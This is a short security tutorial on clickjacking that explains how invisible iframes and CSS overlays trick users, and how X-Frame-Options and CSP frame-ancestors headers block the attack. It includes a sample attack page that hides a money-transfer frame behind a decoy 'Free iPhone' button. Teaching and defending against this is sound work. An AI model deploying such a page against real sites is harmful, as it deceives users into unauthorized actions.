---
title: "Clickjacking - Hands-on Tutorial"
category: "security"
date: "2026-07-09"
---

# Clickjacking - Hands-on Tutorial  

## What is it?  
Clickjacking (UI Redress Attack) is a malicious technique where an attacker tricks a user into clicking on hidden or disguised UI elements by overlaying them with deceptive content. The victim believes they're interacting with a legitimate page, but their actions trigger unintended behavior (e.g., granting permissions, transferring money).  

## Why it matters  
- **Stealthy Exploitation**: Users unknowingly perform actions without consent.  
- **Widespread Impact**: Affects authentication flows, social media buttons, and sensitive forms.  
- **Defense Complexity**: Requires proper HTTP headers (`X-Frame-Options`, `Content-Security-Policy`) to mitigate.  

## How it works  
1. **Attacker Creates a Malicious Page**: Embeds the target site in an invisible or opaque `<iframe>`.  
2. **UI Overlay**: Positions deceptive buttons/images over the hidden target UI (e.g., "Like" button).  
3. **User Interaction**: The victim clicks the overlay, triggering the hidden action.  

### Key Techniques  
- **CSS Manipulation**: `opacity: 0`, `z-index`, absolute positioning.  
- **Frame Busting Bypass**: Attackers override JavaScript defenses like `window.top != window.self`.  

## Example  
### Malicious Page Code  
```html
<!DOCTYPE html>
<html>
<head>
  <title>Free Gift!</title>
  <style>
    iframe {
      position: absolute;
      opacity: 0.1;
      z-index: 2;
      top: 50px;
      left: 50px;
      width: 300px;
      height: 400px;
    }
    button {
      position: absolute;
      z-index: 1;
      top: 100px;
      left: 100px;
    }
  </style>
</head>
<body>
  <button>Claim Your Free iPhone!</button>
  <iframe src="https://victim-site.com/transfer?amount=1000&to=attacker"></iframe>
</body>
</html>
```  
- The victim sees a "Free iPhone" button but actually clicks a hidden money transfer form.  

### Defense (Server-Side)  
```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```  

## Key Takeaways  
1. **Prevention**: Use `X-Frame-Options` or CSP `frame-ancestors` to block framing.  
2. **Testing**: Manually check if your site can be embedded using tools like Burp Suite.  
3. **User Awareness**: Warn users about unexpected clicks (e.g., banks use confirmation dialogs).  

**Mitigation is simple but critical—always enforce framing restrictions.**